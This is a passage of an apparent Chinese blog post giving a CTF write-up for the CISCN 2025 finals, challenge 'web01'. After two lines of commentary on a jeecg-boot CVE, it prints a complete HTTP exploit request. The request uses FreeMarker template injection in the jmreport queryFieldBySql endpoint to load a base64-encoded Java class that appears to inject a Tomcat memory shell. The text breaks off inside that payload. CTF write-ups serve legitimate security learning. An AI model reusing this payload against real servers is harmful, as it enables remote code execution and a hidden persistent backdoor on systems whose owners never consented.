@@ -1,0 +1,549 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
+    <title>CISCN-2025-决赛 - MoonlitSyntax</title>
+
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-GERNH3ZV.css'>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<body class="l-body">
+
+<nav class="c-nav">
+    <a href="/" class="c-nav__link">首页</a>
+    <a href="/archives" class="c-nav__link">归档</a>
+    <a href="/tags" class="c-nav__link">标签</a>
+    <a href="/categories" class="c-nav__link">分类</a>
+    <a href="/links" class="c-nav__link">友链</a>
+    <a href="/about" class="c-nav__link">关于</a>
+    <button id="search-button" class="c-nav__search-btn">
+        <i class="fas fa-search"></i>
+    </button>
+</nav>
+
+
+<div class="l-container">
+    <div class="l-nav-spacer"></div>
+    <main class="l-main">
+        
+<div class="c-post">
+    <aside class="c-post__toc">
+        <h2 class="c-post__toc-title">目录</h2>
+        
+        <ol class="c-post__toc-list" id="toc-list"></ol>
+        
+    </aside>
+    <div class="c-post__main">
+        <header class="c-post__header">
+            <h1 class="c-post__title">CISCN-2025-决赛</h1>
+            <div class="c-post__meta">
+                <span class="c-post__meta-create"><i class="fas fa-calendar-plus"></i> 创建：2025-07-19 16:20</span>
+                <span class="c-post__meta-updated"><i class="fas fa-calendar-check"></i> 更新：2025-07-19 16:20</span>
+                <span class="c-post__meta-category"><i class="fas fa-folder-open"></i> 分类：<a href="/categories/CTF"><strong>CTF</strong></a></span>
+            </div>
+            <div class="c-post__tags">
+                <a href="/tags/Writeup" class="c-post__tag">#Writeup</a>
+            </div>
+            <div class="c-post__description">
+                季军🥉 &amp;&amp; 一等奖
+            </div>
+        </header>
+
+        <article class="c-post__content prose"><h2 id="第一天">第一天</h2>
+<h3 id="web01">web01</h3>
+<p>jeecg-boot的 CVE, 卡了很久, 最后才去写的这道题, 最后进内网只剩十几分钟了, 基本没什么时间做题了, 有点可惜</p>
+<p>虽然但是, 真的没有挂吗, 2 分钟容器都没启动完, 就有人切完了这题, 真逆天</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">http</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="http"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/jmreport/queryFieldBySql?token=1</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">8.145.34.157:8081</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">18466</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;sql&#34;</span><span class="p">:</span><span class="s2">&#34;call${\&#34;freemarker.template.utility.ObjectConstructor\&#34;?new()(\&#34;javax.script.ScriptEngineManager\&#34;).getEngineByName(\&#34;js\&#34;).eval(\&#34;classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass(&#39;org.apachen.SOAPUtils&#39;).newInstance();}catch(e){clsString=classLoader.loadClass(&#39;java.lang.String&#39;);bytecodeBase64=&#39;yv66vgAAADEBewEAH29yZy9hcGFjaGUvbG9nZ2luZy90L1JlcG9ydFV0aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAMZ2V0Q2xhc3NOYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQAvb3JnLmFwYWNoZS5odHRwLmNsaWVudC5Mb2c0akNvbmZpZ0tweHJ4TGlzdGVuZXIIAAgBAA9nZXRCYXNlNjRTdHJpbmcBAApFeGNlcHRpb25zAQATamF2YS9pby9JT0V4Y2VwdGlvbgcADAEAEGphdmEvbGFuZy9TdHJpbmcHAA4BEUhINHNJQUFBQUFBQUFBSlZZQ1h3VVZ4MytYbmFUMld5V0F0a1NDUGROamsyV0JNS1JFRW9TRWdna0N5UWhOV0J0SjV0SnNyRFozZTRSQ0JSNzBFdXQ5ckFYMVhyVlN0R3FITzBtS1paaXJhMjIzbHByNjFGdnROVXEybUtydHZGN001UE5zUW5ncjJGbTlyMy8rZjJQOTM5OS9yMG5UZ0VvRWswQzdtQzR3NjJHVkcrbjV1Nk1Sa051cjkrbkJhTHV1bURIOGwxVndVQzdyMk56YUc5NGI1MHZFdFVDV2xpQkVKaXlTKzFXM1g0MTBPR3U4cXVSU0YxUWJaTmJGb0dGY211dk82S0Z1LzFhMU4xb3ZCdTBxMk5hSkRva0pGVWdiWTB2NEl1dUZiRGs1RFlMV0t1Q2JackF4RHBmUVBQRXVscTFjSlBhNnVkS1psM1FxL3FiMWJCUC9qWVhyZEZPWDBTZ3FPNy9OTC9NQVFVMk82eTRSR0I2VHQyWWpwUkplOFErZ2FuajdFc2hrNlFRSjJtR1NCcWpZVitnb3pMbTgrdG9UTEVqUzZxeGhzZ3AvUmhOU1RuVGtKMk9GRXduSEdvb3BBWGFCQXB5a2dsems1Wk1MUlF4RTdPa290a0VjcmZXNDhCY1ErUThBVnMwYUJBTFhKcVRMSUs4QzdCUThpNGliMWRiaWNEaWk5Sk54aVhJc1ZOSnJ2elMxZVVMcEc1dnFpbFlaVU9CUUlvMzRvRGIyRmxLTExjeFozSjJWdWFPeHJOTWtyYnlzYk5TSUtOTmEyZnc5UTNpU3ZyYTJtUU9CMVpncGNSK0ZlWHVGVkJJdHlOWDhqdUhTS3YzZXJWUTFCY01LRmhETWkvVjF4bUo2UTMzaEtKQmQ1VXYxRW4wR0p4dU5ieDhjSHNVTTdjRkxSRmQvTGREUVltcFlwUVFCVFVDRXhxanFuZDN2Um95ODlOU1VkMW9ReTJkNnRDaXRZRklWQTE0dVp3N0xyNmpMWE5nTStyczJJQjZnVGtqQ0NJaHpjdTY4b2ExNkdhdHA1Ry9GR3dSbURSYXNBS2licVA2eXA2b1JqZXNPVVRKZ1VZMDJkR0E3UWJDWTVqVExMUDdjanUyNG4xa2tqVXFTV3NOeW9qbWpZVjkwUjQzVmV1a083QlRXdmwrQnFJdFdPTUxxSDZtc2d5MTFQVUJYQ2szcjZKMVlhTURyT2UvY0xCSGEwdmsybmk5b3JxYmRheFhvak9TdkNHdzRDSzRXWFNtM2xxNjRWUDl2bjFTYzVvYURtK0pVY1ljd3lsZjBDMHhxZ2lIMVI2dWgySlJZcUdwWFRMKzdTTUxkMHZyTHMwckJkdkNXaVFVREVRWTFORis2SDFvSXg4Smt3eEtjaWtSTFJKaFpnbk1IWjlKcDVDcDJhWkdWZktZTGdnc3VhQWluWkNzOHk2SWpZS3d3S0tMa3FlQXVoZGZuSThLdWdWbW45ODFCU3pieVV6TWtXcUlTVTd1ZVlQS290aUgvWFpFY0kyQXZWT1R2ZGlqZG1rT2ZOQm9OZGNLcEZQdVJuM0hnZXVSazRFWWJtQVZHc1ROcWo5RzZoc042cHNZUlc4d0VGVjlBWmJIakJHSFFhY2FicFJLV2JWbHVUc2N1QVczeXFyNWtFQld4NUMzTmVGZ1Y4TDZiUmZPQThPTDBVNk9teThPZkFTM3lUYjdVYnFyNDJVbXovd2tvSkxTeDRIYmNZZjAvazRCQjNtM3FtRWlGWld3Zk55QTVXNXV0S29SYmNYeTlacFhQM3V6eHVwT3NvN3Z4WDNTalBzZEtFV1ovSHFBYVJsU2UvdzhEbTM0cEtHaElrcU8xbGhVdS9BeFlsYVJBNS9DcHpQUWc4K01hRi9Hcm9MUEdlM0xQQStjT1dPZEJaL0h3M1k4aEM5d2NCaTFxZUFSZ1VzRytZMkRXeUE3V1VyaVRQOGl2bVRIRVR3cUhYUTZVSXhsOHV1cjlDNHl3cnNsWTNpWDdKeHNqc2R3WExwM2d1RUxEZUlmc2VGeENUOFhaNTIzK3lqb3M2TmZEaEFaQVczUDBCa3k4aWhQUUhrU1g1UFdQOG4yeGp4VC9SRjU1STVoRnBQNUtaeVdvSDNkcUpiTDJjOGxORk1INWRLZ3JYVEszS0RvYitDWkRPekJOMGtmaWJWR3pKRWlLMmZrOFp5WURaN0R0MlN0Zkh2d1JCNHBUOEVMSEJYMnlPOVJGZzQ3Z0w2TDc5bnhIWHhmbXNuaEpDTWFURURrd0kva0NkYVBIeWZ5dHpvd21MOGpSNHlFUlMvaXB6S1VMMG1GNDluOHNyVDVGZXBxOThjaW5aV3g5blpaSzcrQVRicitTMFl3TVJZd2dpRzZRT2hxZURxdEdnUGtpOHorMytDMzBxemYyYkRiYkpvR2dTZllHUE4yMXZnMGY5dXdRZWFQeHJCU01uaDJqRTlyampWTGpWZVI4U3BtOGcvakMydnRmbHJoMWpsTmhtVnN5Mk5NYUZQSDRWTHdkOVl0WVdELzhLdGhyVTFmdmZBQU8xSzFBLy9BUDJYbXZza3BTamE1V0VnTGU2VnFCODdKNmo2Q2Y4bUpoQWx4QnUrUVJoYWoxeXZibkhFVHlOa2hNK1kvK0s4ZFovRXVSeThLR2RXQ0JuTi9yQ0FNTUxRNEszaXJtVFZxeEttbkRyVkRXKy9yTUE1VlMxZ0t0dFN2TDdFSjNsOW1uSWRhRVFvdkorUGpNSTRPRG4waTNTNXN3czRxOW11QmptaW5majJxZFFpSG1NQUVGZXdHYWJFUUJ3UE5tSHhaZ3MwT01VbE1sbHlaYkE2NitDNDEydW11OUhYVUJxSmFCMHRPWEVxMk5sMkhRMlN4ZkVnOFZjNXB0U3dZT2UrSmJMdVlJcWJMQzhITDhtdW1YblBiZVNNSlY3SEVIR0sydkNnMGlEblVhbFFiRzBhYVVYMUc3cXpnRU4vS25wUGFMYzlZczU4WHhxSStmMkdsVG1ZVGk4bmNIdFJQYkk0ZUYwZ1NzOEdMSEpITEZCQjV4Z2xvNnJZSkY4ZXluVW5raWlnMGVscTlGdTBNTWhYWGphRWxtVzJzNURRazBJQ2xva2dhd1BKeDdrek9IMFhRLzJuanNTdUNzS1Q1QXQzQjNYUjU5UmdwT1liSXNiSlVyQktyN1dLbEtPV1JwdWtZTkpsWE81dmdCU2NyRWdzVWR2a2kzc0xLaXNicXdZWkltTmJLMDBEL1lSUHI1SWl1bWJHekcyVnJVRlhKN05BTXF1cGthUW02RGV5NEJwM1JIbTJDRnh6YkdsNjV6WXQ4VWZFeW02aGo4SXVYRm50YlY2OG9WcjBscTVldUxHbTFDUTkxYnVlMFVsRFJ3ZW5USnJZeVZacDdldHBVbTJqQVBIWkJLMmdGLzdQSkd5V0FkSGwvNU5zbTc4ajZlNjcrRm5MWTA5ODM2bThIdjNpbDV6T2R2eW9vU2ZEdHpPdkZ4RHluMlBZNHJ1T3I4WEhjZkl6TEtheDFRRFpkWURZeU1RY1pwZ2l5OEQxQkY4ekx2U2t1UmtwSlc1S1gzNHRMUjhvN2lheVdYa3c5amhseHpEbU8rWHpHc2JnUGVTZmd5aXc4Z2FJaGhabjBEcGhQRlF2bzFVSXN4eUpkY1pZaDNGUXN2eWFUbHJjT09YeVlKcFNUVjFLbDUrVmI4ay8xWXZYUmhOZzAzZTZjWWFMU0U2TFNxYVJFRjhXUnpSVDFFam1rSWZtWm0vcmc4UlRNUEFURmVoalcxSlBZMnFKNzBKeTVxUmN0Y1Z4UmtCK0hldFFqanVvcWVOdW5IUlpkYVJaUytTeWdxRUo2NU9iT1V1U2lTRGRpT2ZmU3VMb1dsNUU2bHlhdFkwUXNVbVhDc0h4VTZvYkpyeXFzSjgxR2ZxK0JaUUFUWVZXUW9xQmFLTHcxeXNjQXQ0YXY4V09ER01CVVdNeEZTVlZPYWEzd21rNlc2UEF3ak1kRzRiUmlHRTRpWVk1QUd6UWRwL1pCRWVJTTNiQng3eHhCT0hBYXNYcFgzbU80cmg4SFUvQXNYaDM2d1krYjQvandJYnlRNStyRnh6eXVmdHhGdkswdTVrUS83a2xCSHc2VnB1WmxwMXJpK0VScGFyWTE4OEYrZkRhRnc4WjgrWDBTS1MxNWNSeU80OHU5K0VwMmFoeEgrL0dZQllleDM1VVp6MDd0UjYrRlkxMC9zK3lKMHJRRTkya2NpZU5VcVpLdFpLZkY4ZlRsMllwTHZncjY4YXpBY2Jnc2t5YkY4WHdjUDhoVzR2aWh1WjRuYVg5aXBSMTkrQm4zRXRTUytPZkd3cThFVlZzOXg0aUNqVWZwbTRtUU4yTUtuNnU1V3NhZ3JtSFF5N0dTUWE1bW1EME04UTRHdVlmQlBNaHczc2JWQjFHRGh4bldSMUdMVTlpRVo3QVpyNkFPcjVQNkxLZXNON0VOYjZGUmowY0RwZDdHQ0hTZ2szRjZFRTN3WVJjcjBJMm5zUnQrV3JBU1Q2QUxBV1p1TlNVR0dXQ1pnT2NTRVR4blJ0Q0dOeERDMVdaQ0xZQjFnRWFsNlhuQ3kwQk13UjRGUGN3WjRHM3NxWlJwUTFKZXNQaDhWYVlaUlpUckdiU1pLMUtGVzlUbk8vSHJQdnplaVQvd2VScDc2ZzlqdWlkLytFOWJLU3ZJd2ovWFViMVhPSmxoNVV6UStTeHhha0NlblBLNExnVy9TRytrNEZXaVhzYmRVNUQ1ME1QSWtxWDJGaVZOS0xVV3hQRzI1L0RBYTY3bjREaUpNeTFzT3Y5K3lzV292ZWZLaTRzVVdZd1RkQTFuek1nVUV3VVEveFRzSkdaWGNQZEs3bDlGQ3BWdHN4V3ptTk56bWRrTGlXOEJrUzBtdG9PRk9vMy8vb1EvNngxaEZWN2pEdlN2MTlsV2VaaXpYdjZDdi9LdHNMamZ3TitvVWVJNkdkWjNvU2c0cStDSVI4R1pkTWNJOUdTbk1PcndFYTVaOVAvTFhPY1VhWDBpZzFYRUJtT2hJeFBqd25sU1RHbXh1dUppV3ErWXdSd1VzK0ppYmgzVHJ6Ny9xSzQ5bisxbE1QOW0wd1l3OGltTWJqckM5QzdDL1JncG9zeVRidDJqdWFSTkorcFZ3cUpYZUJIYlRMYmVBZHpDcW51MFVlL3hLUU5rWTBvMDhNOW9IbVRqL2NBSWtmQXdDV1dJRGtpcmwvU0ovSHFYVXhTSTA4SWRGOHRjZkpmRVJabUhjVHJzRk9YV0ozR2t4WkpaM2NpOUF2NTRxTVdTeCsreTAyaWdLMlVlcDdoTWx5REwxWnB0MVprcWhqTmxXNU80VWt1dCtVWW1yV05GbGJPaXVwbkc1U1BpdlkrN0IyanVCeG5mYTBsM0N5bXZJK1VOVE4yRHJLMGJ5WE16dVc3Q2Z0eXFvN09SQ003Q0FqR1BVWlk0bFlyNWpHZ0thUmZwYTFaeUZwcHI2N0ZTTEREYjlnR3gwR3lvKzhXaUJJcTVzbGxYNlExNEVNVUJrbG5OMzNwSDV1TWRrZy9Qalh0eG45bGdtMHlVRHc1SGVmM1lLTmVZZ0RVa28xek5QMEsybGtCdlRBSjYwM0MrVVVDYmpFTllWN0ZqbGZOOHVZWjRqc1JhdG9mYmFmUWR4TzlPMGgwaTVWMmt2SnU5N0I1MnEzdkpjeis1N3NQMWVHQVkxb3RGcFlsMXVZbHJFM0wwTlNzNWk4eTFEWXpFSU5ZSGliV1JzZGNUNjVMaFdOZVlHVnR0WXIxS1lxMy9IbzYxVFd4T3pFRWV2UWlBUXFlb1A0RVpUckhsQk9aZjFNUWlkT2N2b1VrT1RHYzF6MkRqbUFuOEQrcC9xQTQwR2dBQQgAEAEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAEgATCgAPABQBAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAXAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAIbGlzdGVuZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQAIY29udGV4dHMBABBMamF2YS91dGlsL0xpc3Q7AQAEdGhpcwEAIUxvcmcvYXBhY2hlL2xvZ2dpbmcvdC9SZXBvcnRVdGlsOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBACRMamF2YS91dGlsL0xpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBAA5qYXZhL3V0aWwvTGlzdAcAJAEAEmphdmEvdXRpbC9JdGVyYXRvcgcAJgEADVN0YWNrTWFwVGFibGUMABIAFgoABAApAQAKZ2V0Q29udGV4dAEAEigpTGphdmEvdXRpbC9MaXN0OwwAKwAsCgACAC0BAAhpdGVyYXRvcgEAFigpTGphdmEvdXRpbC9JdGVyYXRvcjsMAC8AMAsAJQAxAQAHaGFzTmV4dAEAAygpWgwAMwA0CwAnADUBAARuZXh0AQAUKClMamF2YS9sYW5nL09iamVjdDsMADcAOAsAJwA5AQALZ2V0TGlzdGVuZXIBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAOwA8CgACAD0BAAthZGRMaXN0ZW5lcgEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgwAPwBACgACAEEBAARrZXkxAQAIY2hpbGRyZW4BABNMamF2YS91dGlsL0hhc2hNYXA7AQADa2V5AQALY2hpbGRyZW5NYXABAAZ0aHJlYWQBABJMamF2YS9sYW5nL1RocmVhZDsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsHAE0BABBqYXZhL2xhbmcvVGhyZWFkBwBPAQARamF2YS91dGlsL0hhc2hNYXAHAFEBABNqYXZhL3V0aWwvQXJyYXlMaXN0BwBTCgBUACkBAApnZXRUaHJlYWRzCABWAQAMaW52b2tlTWV0aG9kAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsMAFgAWQoAAgBaAQAHZ2V0TmFtZQwAXAAGCgBQAF0BABxDb250YWluZXJCYWNrZ3JvdW5kUHJvY2Vzc29yCABfAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAGEAYgoADwBjAQAGdGFyZ2V0CABlAQAFZ2V0RlYMAGcAWQoAAgBoAQAGdGhpcyQwCABqCABEAQAGa2V5U2V0AQARKClMamF2YS91dGlsL1NldDsMAG0AbgoAUgBvAQANamF2YS91dGlsL1NldAcAcQsAcgAxAQADZ2V0DAB0ADwKAFIAdQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAdwB4CgAEAHkBAA9qYXZhL2xhbmcvQ2xhc3MHAHsKAHwAXQEAD1N0YW5kYXJkQ29udGV4dAgAfgEAA2FkZAEAFShMamF2YS9sYW5nL09iamVjdDspWgwAgACBCwAlAIIBABVUb21jYXRFbWJlZGRlZENvbnRleHQIAIQBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DACGAIcKAFAAiAEACHRvU3RyaW5nDACKAAYKAHwAiwEAGVBhcmFsbGVsV2ViYXBwQ2xhc3NMb2FkZXIIAI0BAB9Ub21jYXRFbWJlZGRlZFdlYmFwcENsYXNzTG9hZGVyCACPAQAJcmVzb3VyY2VzCACRCAAdAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24HAJQBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYMABIAlgoAlQCXAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24HAJkBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uBwCbAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgcAnQEACVNpZ25hdHVyZQEAJigpTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQATamF2YS9sYW5nL1Rocm93YWJsZQcAoQEACWNsYXp6Qnl0ZQEAAltCAQALZGVmaW5lQ2xhc3MBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwCrAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DACtAK4KAFAArwEADmdldENsYXNzTG9hZGVyDACxAIcKAHwAsgwABQAGCgACALQBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DAC2ALcKAKwAuAEAC25ld0luc3RhbmNlDAC6ADgKAHwAuwwACgAGCgACAL0BAAxkZWNvZGVCYXNlNjQBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCDAC/AMAKAAIAwQEADmd6aXBEZWNvbXByZXNzAQAGKFtCKVtCDADDAMQKAAIAxQgApQcApAEAEWphdmEvbGFuZy9JbnRlZ2VyBwDJAQAEVFlQRQwAywCoCQDKAMwBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAM4AzwoAfADQAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwDSAQANc2V0QWNjZXNzaWJsZQEABChaKVYMANQA1QoA0wDWAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsMANgA2QoAygDaAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DADcAN0KANMA3gEAB29iamVjdHMBABNbTGphdmEvbGFuZy9PYmplY3Q7AQAJbGlzdGVuZXJzAQAJYXJyYXlMaXN0AQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAKaXNJbmplY3RlZAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspWgwA5QDmCgACAOcBABthZGRBcHBsaWNhdGlvbkV2ZW50TGlzdGVuZXIIAOkBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAFgA6woAAgDsAQAcZ2V0QXBwbGljYXRpb25FdmVudExpc3RlbmVycwgA7gcA4QEAEGphdmEvdXRpbC9BcnJheXMHAPEBAAZhc0xpc3QBACUoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS91dGlsL0xpc3Q7DADzAPQKAPIA9QEAGShMamF2YS91dGlsL0NvbGxlY3Rpb247KVYMABIA9woAVAD4CgBUAIIBABxzZXRBcHBsaWNhdGlvbkV2ZW50TGlzdGVuZXJzCAD7AQAHdG9BcnJheQEAFSgpW0xqYXZhL2xhbmcvT2JqZWN0OwwA/QD+CgBUAP8BAAFpAQABSQEADWV2aWxDbGFzc05hbWUBABJMamF2YS9sYW5nL1N0cmluZzsBAARzaXplAQADKClJDAEFAQYKAFQBBwEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwAdAEJCgBUAQoBAAxkZWNvZGVyQ2xhc3MBAAdkZWNvZGVyAQAHaWdub3JlZAEACWJhc2U2NFN0cgEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcggBEQEAB2Zvck5hbWUMARMAtwoAfAEUAQAMZGVjb2RlQnVmZmVyCAEWAQAJZ2V0TWV0aG9kDAEYAM8KAHwBGQEAEGphdmEudXRpbC5CYXNlNjQIARsBAApnZXREZWNvZGVyCAEdAQAGZGVjb2RlCAEfAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24HASEBAA5jb21wcmVzc2VkRGF0YQEAA291dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAJpbgEAHkxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtOwEABnVuZ3ppcAEAH0xqYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbTsBAAZidWZmZXIBAAFuAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HASwBABxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtBwEuAQAdamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW0HATAKAS0AKQEABShbQilWDAASATMKAS8BNAEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwAEgE2CgExATcBAARyZWFkAQAFKFtCKUkMATkBOgoBMQE7AQAFd3JpdGUBAAcoW0JJSSlWDAE9AT4KAS0BPwEAC3RvQnl0ZUFycmF5AQAEKClbQgwBQQFCCgEtAUMBAANvYmoBAAlmaWVsZE5hbWUBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAARnZXRGAQA/KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DAFJAUoKAAIBSwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkBwFNCgFOANYKAU4AdQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcBUQEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBVAFVCgB8AVYBAA1nZXRTdXBlcmNsYXNzDAFYAHgKAHwBWQoBUgAUAQAMdGFyZ2V0T2JqZWN0AQAKbWV0aG9kTmFtZQEAB21ldGhvZHMBABtbTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBACJMamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb247AQAKcGFyYW1DbGF6egEAEltMamF2YS9sYW5nL0NsYXNzOwEABXBhcmFtAQAGbWV0aG9kAQAJdGVtcENsYXNzBwFfAQASZ2V0RGVjbGFyZWRNZXRob2RzAQAdKClbTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAWgBaQoAfAFqCgDTAF0BAAZlcXVhbHMMAW0AgQoADwFuAQARZ2V0UGFyYW1ldGVyVHlwZXMBABQoKVtMamF2YS9sYW5nL0NsYXNzOwwBcAFxCgDTAXIKAJwAFAEACmdldE1lc3NhZ2UMAXUABgoAmgF2CgCVABQBAAg8Y2xpbml0PgoAAgApACEAAgAEAAAAAAAOAAEABQAGAAEABwAAABAAAQABAAAABBMACbAAAAAAAAEACgAGAAIACwAAAAQAAQANAAcAAAAXAAMAAQAAAAu7AA9ZEwARtwAVsAAAAAAAAQASABYAAQAHAAAA2AADAAUAAAA2KrcAKiq2AC5MK7kAMgEATSy5ADYBAJkAGyy5ADoBAE4qLbcAPjoEKi0ZBLYAQqf/4qcABEyxAAEABAAxADQAGAAEABkAAAAmAAkAAAAkAAQAJgAJACcAIAAoACcAKQAuACoAMQAtADQAKwA1ADAAGgAAACoABAAnAAcAGwAcAAQAIAAOAB0AHAADAAkAKAAeAB8AAQAAADYAIAAhAAAAIgAAAAwAAQAJACgAHgAjAAEAKAAAABoABP8AEAADBwACBwAlBwAnAAD5ACBCBwAYAAABACsALAADAAcAAALYAAMADgAAAXm7AFRZtwBVTBJQEle4AFvAAE7AAE5NAU4sOgQZBL42BQM2BhUGFQWiAUEZBBUGMjoHGQe2AF4SYLYAZJkAsy3HAK8ZBxJmuABpEmu4AGkSbLgAacAAUjoIGQi2AHC5AHMBADoJGQm5ADYBAJkAgBkJuQA6AQA6ChkIGQq2AHYSbLgAacAAUjoLGQu2AHC5AHMBADoMGQy5ADYBAJkATRkMuQA6AQA6DRkLGQ22AHZOLcYAGi